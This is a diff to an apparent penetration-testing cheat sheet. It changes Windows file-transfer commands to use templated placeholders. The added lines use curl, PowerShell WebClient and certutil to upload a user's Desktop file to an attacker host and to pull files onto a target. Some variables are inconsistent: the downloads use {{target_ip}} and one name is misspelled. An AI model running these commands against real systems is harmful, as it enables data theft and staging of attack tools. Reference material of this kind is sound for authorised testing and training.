@@ -64,24 +64,29 @@ wget http://<attacker-ip>:8080/file.txt
 
 #### Upload 
 ```powershell
-# Using curl
-curl -T C:\Users\Public\file.txt http://<attacker-ip>:8080/
+# Windows: Upload Files from Target to Attacker
+# Upload via cURL (Windows 10+)
+curl -T C:\Users\Public\file.txt http://{{attacker_ip}}:{{my_port}}/file.txt
 
-# Using PowerShell WebClient
-$WebClient = New-Object System.Net.WebClient
-$WebClient.UploadFile("http://<attacker-ip>:8080/file.txt", "PUT", "C:\Users\Public\file.txt")
+# Upload via PowerShell WebClient
+(New-Object System.Net.WebClient).UploadFile("http://{{attacker_ip}}:{{my_port}}/file.txt", "PUT", "C:\Users\chitt\Desktop\report.txt")
+
+# Upload via CMD (inline PowerShell)
+powershell -c "(New-Object System.Net.WebClient).UploadFile('http://{{attakcer_ip}}:{{my_port}}/file.txt','PUT','C:\Users\chitt\Desktop\report.txt')"
 ```
 
 #### Download 
 ```powershell
-# Using Invoke-WebRequest
-Invoke-WebRequest -Uri "http://<attacker-ip>:8080/file.txt" -OutFile "C:\Users\Public\file.txt"
+# Windows: Download file from attacker -> target
 
-# Using certutil
-certutil -urlcache -split -f "http://<attacker-ip>:8080/file.txt" "C:\Users\Public\file.txt"
+# PowerShell (Win7+, modern & reliable)
+Invoke-WebRequest -Uri "http://{{target_ip}}:{{my_port}}/file.txt" -OutFile "C:\Users\Public\file.txt"
 
-# Using curl
-curl -o C:\Users\Public\file.txt http://<attacker-ip>:8080/file.txt
+# CMD or PowerShell (works everywhere, older trick)
+certutil -urlcache -split -f "http://{{target_ip}}:{{my_port}}/file.txt" "C:\Users\Public\file.txt"
+
+# CMD or PowerShell (Win10+/Server2019+ only)
+curl -o C:\Users\Public\file.txt http://{{target_ip}}:{{my_port}}/file.txt
 ```
 
 ## 🛡 Security Warning
